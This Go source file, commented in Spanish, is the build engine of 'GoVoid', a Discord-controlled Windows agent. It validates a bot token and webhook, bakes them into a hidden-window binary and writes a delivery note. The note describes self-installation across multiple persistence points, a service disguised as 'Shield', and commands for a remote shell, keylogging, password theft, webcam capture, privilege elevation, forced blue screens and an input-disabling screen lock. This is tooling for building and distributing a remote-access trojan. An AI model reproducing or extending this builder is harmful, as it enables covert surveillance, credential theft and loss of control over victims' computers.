// Package kit es el motor de compilación de clientes: valida credenciales,
// inyecta la identidad con -ldflags, comprueba el binario resultante y arma el
// paquete de entrega.
//
// Lo usan dos consumidores distintos: el builder de línea de comandos y
// GoVoid Studio. Toda la lógica vive aquí para que los dos caminos produzcan
// exactamente el mismo binario y la misma nota.
package kit

import (
	"archive/zip"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/local/govoid/internal/config"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"
)

const (
	// ModulePath es el módulo del agente. El builder vive dentro del mismo
	// repo, así que compilar es solo apuntar a ./cmd/agent.
	ModulePath = "github.com/local/govoid"

	// ConfigPath es el paquete cuyas variables parchea el enlazador.
	ConfigPath = ModulePath + "/internal/config"

	// DiscordAPI es la base de la API REST.
	DiscordAPI = "https://discord.com/api/v10"

	// UserAgent es obligatorio: Discord responde 403 sin él.
	UserAgent = "DiscordBot (" + ModulePath + ", 1.0)"

	// InvitePermissions es la suma de permisos que el agente necesita para
	// crear canales de sesión y publicar el panel: MANAGE_CHANNELS(16) +
	// VIEW_CHANNEL(1024) + SEND_MESSAGES(2048) + MANAGE_MESSAGES(8192) +
	// EMBED_LINKS(16384) + ATTACH_FILES(32768) + READ_MESSAGE_HISTORY(65536).
	InvitePermissions = 125968
)

var (
	reID       = regexp.MustCompile(`^[A-Za-z][A-Za-z0-9]{2,23}$`)
	reSafeName = regexp.MustCompile(`^[^"%&|<>^]{1,48}$`)
	reSnow     = regexp.MustCompile(`^\d{15,25}$`)
	reHook     = regexp.MustCompile(`^https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+$`)
	rePrefix   = regexp.MustCompile(`^[a-z0-9-]{1,32}$`)
	reFile     = regexp.MustCompile(`^[A-Za-z0-9._-]{0,64}$`)
)

// Options es todo lo que distingue una copia del agente de otra.
type Options struct {
	ID             string // token corto: mutex, servicio, tareas, rutas
	Name           string // nombre visible en panel y webhooks
	Token          string // token del bot de Discord
	Guild          string // guild donde vive el C2
	Webhook        string // webhook de avisos
	Category       string // categoría de los canales de sesión (opcional)
	ChannelPrefix  string // prefijo de los canales de sesión
	BinaryName     string // nombre del ejecutable instalado
	RunKey         string // valor en las claves Run
	TaskLogon      string // tarea de logon
	TaskBoot       string // tarea de arranque
	ServiceDisplay string // nombre visible del servicio
	OutDir         string // carpeta de salida
	Repo           string // raíz del código del agente
	KeepSymbols    bool   // sin -s -w, para depurar
	ForceShared    bool   // permite reutilizar el token del agente local
	Package        bool   // empaquetar el resultado en .zip
}

// Logf recibe las líneas de progreso. Nunca se llama en paralelo: Build
// serializa sus escrituras.
type Logf func(line string)

func (f Logf) call(line string) {
	if f != nil {
		f(line)
	}
}

func (f Logf) printf(format string, args ...any) {
	if f != nil {
		f(fmt.Sprintf(format, args...))
	}
}

// Normalize valida y rellena los valores derivados. Es idempotente.
func (o *Options) Normalize() error {
	o.ID = strings.TrimSpace(o.ID)
	o.Name = strings.TrimSpace(o.Name)
	o.Token = strings.TrimSpace(o.Token)
	o.Guild = strings.TrimSpace(o.Guild)
	o.Webhook = strings.TrimSpace(o.Webhook)
	o.Category = strings.TrimSpace(o.Category)
	o.ChannelPrefix = strings.TrimSpace(o.ChannelPrefix)
	o.BinaryName = strings.TrimSpace(o.BinaryName)
	o.RunKey = strings.TrimSpace(o.RunKey)
	o.TaskLogon = strings.TrimSpace(o.TaskLogon)
	o.TaskBoot = strings.TrimSpace(o.TaskBoot)
	o.ServiceDisplay = strings.TrimSpace(o.ServiceDisplay)

	switch {
	case o.ID == "":
		return errors.New("falta el identificador del cliente")
	case !reID.MatchString(o.ID):
		return errors.New("el identificador debe empezar por letra y tener 3-24 letras o números (acaba en nombres de objeto del kernel)")
	case o.Name == "":
		return errors.New("falta el nombre visible")
	case !reSafeName.MatchString(o.Name):
		return errors.New(`el nombre visible no puede llevar comillas ni %&|<>^`)
	case len(o.Token) < 20:
		return errors.New("falta el token del bot o es demasiado corto")
	case !reSnow.MatchString(o.Guild):
		return errors.New("el id de la guild debe ser numérico")
	case o.Category != "" && !reSnow.MatchString(o.Category):
		return errors.New("el id de categoría debe ser numérico")
	case !reHook.MatchString(o.Webhook):
		return errors.New("el webhook debe ser https://discord.com/api/webhooks/<id>/<clave>")
	case o.ChannelPrefix != "" && !rePrefix.MatchString(o.ChannelPrefix):
		return errors.New("el prefijo de canal solo admite minúsculas, números y guiones")
	}

	if o.ChannelPrefix == "" {
		o.ChannelPrefix = "sesion-"
	}
	if o.BinaryName == "" {
		o.BinaryName = strings.ToLower(o.ID) + ".exe"
	}
	if !reFile.MatchString(o.BinaryName) || !strings.HasSuffix(strings.ToLower(o.BinaryName), ".exe") {
		return errors.New("el binario debe ser un nombre de archivo terminado en .exe")
	}
	if o.RunKey == "" {
		o.RunKey = o.ID + "Update"
	}
	if o.TaskLogon == "" {
		o.TaskLogon = o.ID + "Update"
	}
	if o.TaskBoot == "" {
		o.TaskBoot = o.ID + "UpdateBoot"
	}
	if o.ServiceDisplay == "" {
		o.ServiceDisplay = o.Name + " Shield"
	}
	for _, value := range []string{o.RunKey, o.TaskLogon, o.TaskBoot} {
		if !reFile.MatchString(value) {
			return fmt.Errorf("nombre inválido para el registro: %q", value)
		}
	}

	if o.Repo == "" {
		exe, err := os.Executable()
		if err != nil {
			return err
		}
		o.Repo = filepath.Dir(exe)
	}
	if abs, err := filepath.Abs(o.Repo); err == nil {
		o.Repo = abs
	}
	if !IsRepo(o.Repo) {
		return fmt.Errorf("%s no parece la raíz del proyecto (falta go.mod de %s)", o.Repo, ModulePath)
	}

	if o.OutDir == "" {
		o.OutDir = filepath.Join(o.Repo, "dist", o.ID)
	}
	if abs, err := filepath.Abs(o.OutDir); err == nil {
		o.OutDir = abs
	}
	return nil
}

// ValidateRemote valida solo lo que se comprueba contra la API: token, guild,
// categoría y webhook. Sirve para el botón "Probar conexión", que no debe
// exigir todavía una carpeta de código ni un nombre de binario.
func (o Options) ValidateRemote() error {
	token := strings.TrimSpace(o.Token)
	guild := strings.TrimSpace(o.Guild)
	webhook := strings.TrimSpace(o.Webhook)
	category := strings.TrimSpace(o.Category)

	switch {
	case len(token) < 20:
		return errors.New("falta el token del bot o es demasiado corto")
	case !reSnow.MatchString(guild):
		return errors.New("el id de la guild debe ser numérico")
	case category != "" && !reSnow.MatchString(category):
		return errors.New("el id de categoría debe ser numérico")
	case !reHook.MatchString(webhook):
		return errors.New("el webhook debe ser https://discord.com/api/webhooks/<id>/<clave>")
	}
	return nil
}

// IsRepo indica si dir es la raíz de un módulo que contiene ./cmd/agent.
func IsRepo(dir string) bool {
	if dir == "" {
		return false
	}
	if _, err := os.Stat(filepath.Join(dir, "go.mod")); err != nil {
		return false
	}
	info, err := os.Stat(filepath.Join(dir, "cmd", "agent"))
	return err == nil && info.IsDir()
}

// FindRepo sube desde start buscando la raíz del proyecto. Sirve para que la
// app funcione aunque se lance desde dist o desde el escritorio.
func FindRepo(start string) string {
	dir := start
	if dir == "" {
		if exe, err := os.Executable(); err == nil {
			dir = filepath.Dir(exe)
		}
	}
	if abs, err := filepath.Abs(dir); err == nil {
		dir = abs
	}
	for {
		if IsRepo(dir) {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return ""
		}
		dir = parent
	}
}

// --- credenciales ---

// Report es lo que devuelve una validación correcta.
type Report struct {
	BotName        string
	BotID          string
	GuildName      string
	WebhookChannel string
	WebhookGuild   string
	Warning        string
}

type discordUser struct {
	ID       string `json:"id"`
	Username string `json:"username"`
}

type discordGuild struct {
	Name string `json:"name"`
}

type discordHook struct {
	ChannelID string `json:"channel_id"`
	GuildID   string `json:"guild_id"`
	Name      string `json:"name"`
}

var httpClient = &http.Client{Timeout: 20 * time.Second}

// Check valida token, guild y webhook contra la API. No compila nada.
func (o Options) Check(ctx context.Context, logf Logf) (Report, error) {
	var report Report

	logf.call("validando credenciales...")

	var me discordUser
	if err := getJSON(ctx, DiscordAPI+"/users/@me", o.Token, &me); err != nil {
		return report, fmt.Errorf("token inválido: %w", err)
	}
	report.BotName, report.BotID = me.Username, me.ID
	logf.printf("  token OK   : %s (app id %s)", me.Username, me.ID)

	var guild discordGuild
	if err := getJSON(ctx, DiscordAPI+"/guilds/"+o.Guild, o.Token, &guild); err != nil {
		return report, fmt.Errorf("el bot no ve la guild %s (¿está invitado?): %w", o.Guild, err)
	}
	report.GuildName = guild.Name
	logf.printf("  guild OK   : %s", guild.Name)

	var hook discordHook
	if err := getJSON(ctx, o.Webhook, "", &hook); err != nil {
		return report, fmt.Errorf("webhook inválido: %w", err)
	}
	report.WebhookChannel, report.WebhookGuild = hook.ChannelID, hook.GuildID
	logf.printf("  webhook OK : canal %s en guild %s", hook.ChannelID, hook.GuildID)

	if hook.GuildID != "" && hook.GuildID != o.Guild {
		report.Warning = fmt.Sprintf("el webhook vive en la guild %s, no en la del bot (%s)", hook.GuildID, o.Guild)
		logf.printf("  aviso      : %s", report.Warning)
	}
	return report, nil
}

// GuardSharedToken impide el fallo clásico: compilar un cliente con el token
// del agente que ya corre en esta máquina. Discord admite una sola sesión de
// gateway por token; las dos copias se expulsan en bucle y ninguna responde.
func (o Options) GuardSharedToken() (string, error) {
	own := AppIDFromToken(config.BotToken)
	built := AppIDFromToken(o.Token)

	if own == "" || built == "" || own != built {
		return "", nil
	}
	if o.ID == config.ProductID {
		return "", nil
	}
	if o.ForceShared {
		return fmt.Sprintf("mismo token que %s: las dos copias se expulsarán", config.ProductID), nil
	}
	return "", fmt.Errorf("el token pertenece a la app %s, la misma del agente %s que ya corre aquí\n"+
		"dos agentes con el mismo token se cierran la sesión mutuamente y ninguno responde\n"+
		"usa el token de OTRA aplicación de Discord para el cliente %s",
		own, config.ProductID, o.ID)
}

// AppIDFromToken saca el id de aplicación del propio token: la primera sección
// es el snowflake de la app en base64url.
func AppIDFromToken(token string) string {
	head, _, found := strings.Cut(strings.TrimSpace(token), ".")
	if !found {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(head)
	if err != nil {
		return ""
	}
	decoded := string(raw)
	if decoded == "" {
		return ""
	}
	for _, char := range decoded {
		if char < '0' || char > '9' {
			return ""
		}
	}
	return decoded
}

// InviteURL arma el enlace de invitación con los scopes y permisos que el
// agente necesita. Devuelve error si el token no lleva un app id legible.
func InviteURL(token string) (string, error) {
	appID := AppIDFromToken(token)
	if appID == "" {
		return "", errors.New("el token no permite deducir el id de la aplicación")
	}
	query := url.Values{}
	query.Set("client_id", appID)
	query.Set("scope", "bot applications.commands")
	query.Set("permissions", strconv.Itoa(InvitePermissions))
	return "https://discord.com/oauth2/authorize?" + query.Encode(), nil
}

func getJSON(ctx context.Context, url, token string, target any) error {
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", UserAgent)
	if token != "" {
		request.Header.Set("Authorization", "Bot "+token)
	}

	response, err := httpClient.Do(request)
	if err != nil {
		return err
	}
	defer func() {
		if cerr := response.Body.Close(); cerr != nil {
			_ = cerr
		}
	}()

	body, err := io.ReadAll(io.LimitReader(response.Body, 1<<20))
	if err != nil {
		return err
	}
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("HTTP %d: %s", response.StatusCode, strings.TrimSpace(string(body)))
	}
	return json.Unmarshal(body, target)
}

// --- compilación ---

// Result es el binario terminado.
type Result struct {
	Path     string
	Name     string
	OutDir   string
	Size     int64
	SHA256   string
	Identity string
	NotePath string
	ZipPath  string
}

// FindGo localiza go.exe. Primero el PATH; luego la instalación por defecto
// del instalador oficial.
func FindGo() (string, error) {
	if path, err := exec.LookPath("go"); err == nil {
		return path, nil
	}
	candidate := filepath.Join(os.Getenv("LOCALAPPDATA"), "Programs", "Go", "go", "bin", "go.exe")
	if _, err := os.Stat(candidate); err == nil {
		return candidate, nil
	}
	return "", errors.New("no encuentro go.exe: añade Go al PATH")
}

// Build compila el agente con la identidad del cliente, verifica que el
// binario la lleva dentro y escribe la nota de entrega.
func Build(ctx context.Context, o Options, logf Logf) (*Result, error) {
	if err := o.Normalize(); err != nil {
		return nil, err
	}

	goBin, err := FindGo()
	if err != nil {
		return nil, err
	}
	logf.printf("go         : %s", goBin)

	if err := os.MkdirAll(o.OutDir, 0o755); err != nil {
		return nil, fmt.Errorf("crear %s: %w", o.OutDir, err)
	}
	out := filepath.Join(o.OutDir, o.BinaryName)

	logf.call("compilando...")
	if err := compile(ctx, goBin, o, out, logf); err != nil {
		return nil, err
	}

	info, err := os.Stat(out)
	if err != nil {
		return nil, err
	}
	sum, err := FileSHA256(out)
	if err != nil {
		return nil, err
	}
	logf.printf("  %s  %d bytes  sha256=%s...", info.Name(), info.Size(), sum[:16])

	logf.call("verificando identidad dentro del binario...")
	identity, err := ReadIdentity(ctx, out)
	if err != nil {
		return nil, err
	}
	if !strings.Contains(identity, o.ID) {
		return nil, fmt.Errorf("el binario no lleva la identidad %q: el -ldflags no llegó", o.ID)
	}
	logf.call("  identidad correcta")

	result := &Result{
		Path:     out,
		Name:     o.BinaryName,
		OutDir:   o.OutDir,
		Size:     info.Size(),
		SHA256:   sum,
		Identity: identity,
	}

	result.NotePath = filepath.Join(o.OutDir, "ENTREGA.txt")
	if err := os.WriteFile(result.NotePath, []byte(o.deliveryNote(result)), 0o644); err != nil {
		return nil, fmt.Errorf("escribir %s: %w", result.NotePath, err)
	}

	sums := fmt.Sprintf("%s  %s\n", sum, o.BinaryName)
	if err := os.WriteFile(filepath.Join(o.OutDir, "SHA256SUMS.txt"), []byte(sums), 0o644); err != nil {
		return nil, fmt.Errorf("escribir SHA256SUMS.txt: %w", err)
	}

	if o.Package {
		logf.call("empaquetando...")
		zipPath, err := o.PackageDir(result)
		if err != nil {
			return nil, err
		}
		result.ZipPath = zipPath
		logf.printf("  %s", filepath.Base(zipPath))
	}
	return result, nil
}

func compile(ctx context.Context, goBin string, o Options, out string, logf Logf) error {
	ldflags := []string{}
	if !o.KeepSymbols {
		ldflags = append(ldflags, "-s", "-w")
	}
	ldflags = append(ldflags, "-H=windowsgui")

	overrides := [][2]string{
		{"ProductID", o.ID},
		{"AppName", o.Name},
		{"BotToken", o.Token},
		{"GuildID", o.Guild},
		{"WebhookURL", o.Webhook},
		{"CategoryID", o.Category},
		{"ChannelPrefix", o.ChannelPrefix},
		{"BinaryName", o.BinaryName},
		{"RunKeyName", o.RunKey},
		{"TaskLogonName", o.TaskLogon},
		{"TaskBootName", o.TaskBoot},
		{"ServiceDisplayName", o.ServiceDisplay},
	}
	for _, pair := range overrides {
		// strconv.Quote produce la forma exacta que entiende el parser de
		// -ldflags. Sin esto un valor con espacios ("WinHelp Shield") se parte
		// en dos tokens y el enlazador recibe basura.
		definition := ConfigPath + "." + pair[0] + "=" + pair[1]
		ldflags = append(ldflags, "-X", strconv.Quote(definition))
	}

	command := exec.CommandContext(ctx, goBin, "build",
		"-trimpath",
		"-ldflags", strings.Join(ldflags, " "),
		"-o", out,
		"./cmd/agent")
	command.Dir = o.Repo
	command.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)

	output, err := command.CombinedOutput()
	if text := strings.TrimSpace(string(output)); text != "" {
		for _, line := range strings.Split(text, "\n") {
			logf.printf("  %s", strings.TrimRight(line, "\r"))
		}
	}
	if err != nil {
		return fmt.Errorf("go build falló: %w", err)
	}
	return nil
}

// ReadIdentity ejecuta el binario recién compilado en modo --identity. Ese modo
// no conecta al bot, no instala nada y no dibuja: solo escribe los nombres
// resueltos y sale.
func ReadIdentity(ctx context.Context, exe string) (string, error) {
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("govoid_id_%d.txt", time.Now().UnixNano()))
	defer func() { _ = os.Remove(tmp) }()

	command := exec.CommandContext(ctx, exe, "--identity", tmp)
	command.Env = os.Environ()
	if err := command.Run(); err != nil {
		return "", fmt.Errorf("--identity falló: %w", err)
	}

	payload, err := os.ReadFile(tmp)
	if err != nil {
		return "", fmt.Errorf("--identity no escribió el informe: %w", err)
	}
	return strings.TrimRight(string(payload), "\r\n"), nil
}

// FileSHA256 devuelve el hash en hex de un archivo.
func FileSHA256(path string) (string, error) {
	file, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer func() {
		if cerr := file.Close(); cerr != nil {
			_ = cerr
		}
	}()

	hash := sha256.New()
	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}
	return hex.EncodeToString(hash.Sum(nil)), nil
}

// PackageDir comprime el binario, la nota y el manifiesto de hashes.
func (o Options) PackageDir(result *Result) (string, error) {
	name := fmt.Sprintf("%s-%s-%s.zip", safeSlug(o.Name), o.ID, time.Now().Format("20060102-1504"))
	zipPath := filepath.Join(o.OutDir, name)

	file, err := os.Create(zipPath)
	if err != nil {
		return "", fmt.Errorf("crear %s: %w", zipPath, err)
	}
	defer func() {
		if cerr := file.Close(); cerr != nil {
			_ = cerr
		}
	}()

	archive := zip.NewWriter(file)
	entries := []string{result.Path, result.NotePath, filepath.Join(o.OutDir, "SHA256SUMS.txt")}
	for _, entry := range entries {
		if err := addToZip(archive, entry, filepath.Base(entry)); err != nil {
			_ = archive.Close()
			return "", err
		}
	}
	if err := archive.Close(); err != nil {
		return "", fmt.Errorf("cerrar %s: %w", zipPath, err)
	}
	return zipPath, nil
}

func addToZip(archive *zip.Writer, path, name string) error {
	source, err := os.Open(path)
	if err != nil {
		return err
	}
	defer func() {
		if cerr := source.Close(); cerr != nil {
			_ = cerr
		}
	}()

	info, err := source.Stat()
	if err != nil {
		return err
	}
	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return err
	}
	header.Name = name
	header.Method = zip.Deflate

	writer, err := archive.CreateHeader(header)
	if err != nil {
		return err
	}
	_, err = io.Copy(writer, source)
	return err
}

func safeSlug(value string) string {
	var b strings.Builder
	for _, char := range value {
		switch {
		case char >= 'a' && char <= 'z', char >= 'A' && char <= 'Z', char >= '0' && char <= '9':
			b.WriteRune(char)
		case char == ' ' || char == '-' || char == '_':
			b.WriteByte('-')
		}
	}
	slug := strings.Trim(b.String(), "-")
	if slug == "" {
		return "cliente"
	}
	if len(slug) > 40 {
		slug = slug[:40]
	}
	return slug
}

// SortedFiles lista el contenido de la carpeta de salida, ordenado.
func SortedFiles(dir string) []string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	names := make([]string, 0, len(entries))
	for _, entry := range entries {
		names = append(names, entry.Name())
	}
	sort.Strings(names)
	return names
}

// --- entrega ---

func (o Options) deliveryNote(result *Result) string {
	var b strings.Builder

	fmt.Fprintf(&b, "%s — paquete de entrega\n", o.Name)
	b.WriteString(strings.Repeat("=", len(o.Name)+19) + "\n\n")
	fmt.Fprintf(&b, "binario     : %s\n", result.Name)
	fmt.Fprintf(&b, "tamaño      : %d bytes\n", result.Size)
	fmt.Fprintf(&b, "sha256      : %s\n", result.SHA256)
	fmt.Fprintf(&b, "compilado   : %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Fprintf(&b, "arquitectura: %s/%s\n\n", runtime.GOOS, runtime.GOARCH)

	b.WriteString("IDENTIDAD RESUELTA (leída del propio binario)\n")
	b.WriteString("---------------------------------------------\n")
	b.WriteString(result.Identity + "\n\n")

	fmt.Fprintf(&b, `QUÉ ES
------
Agente de administración remota. Se instala solo la primera vez que se ejecuta,
se copia a las rutas de persistencia y se relanza. A partir de ahí sobrevive a
reinicios y aparece como un canal de Discord llamado "%s*".

INSTALACIÓN
-----------
1. Copiar %s a la máquina.
2. Doble clic (o ejecutar como administrador para que active también las capas
   de sistema: System32, servicio y tareas).
3. Esperar ~20 s. Aparece un canal "%s<hostname>" en el Discord.

El binario se instala como:
  %%APPDATA%%\Microsoft\Windows\%s
  %%SystemRoot%%\System32\%s          (solo con administrador)
  %%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup\%s
  HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run\%s
  Tareas programadas: %s (logon), %s (arranque)

PANEL
-----
El canal trae un panel con 15 botones: screenshot, sysinfo, portapapeles,
volcado del keylogger, procesos, reiniciar, apagar, reconectar y el candado de
pantalla.

COMANDOS (16)
-------------
/shell  /screenshot  /keylog  /sysinfo  /ps  /download  /upload  /clip
/msgbox  /webcam  /kill  /shutdown  /passwords  /lockscreen  /elevate  /bsod

DESINSTALAR
-----------
/shutdown desde el panel: borra las capas de persistencia y el ejecutable, y
sale. clean_traces.bat hace la limpieza completa desde una consola elevada.

El candado de pantalla (/lockscreen action:on) deja la máquina sin teclado, sin
ratón y sin escritorio hasta que se mande /lockscreen action:off. Probar
primero en una VM.

FIRMA
-----
Comprobación del binario recibido:
  Get-FileHash -Algorithm SHA256 .\%s
Debe dar: %s
`,
		o.ChannelPrefix,
		result.Name,
		o.ChannelPrefix,
		o.BinaryName, o.BinaryName, o.BinaryName, o.RunKey,
		o.TaskLogon, o.TaskBoot,
		result.Name, result.SHA256)

	return b.String()
}
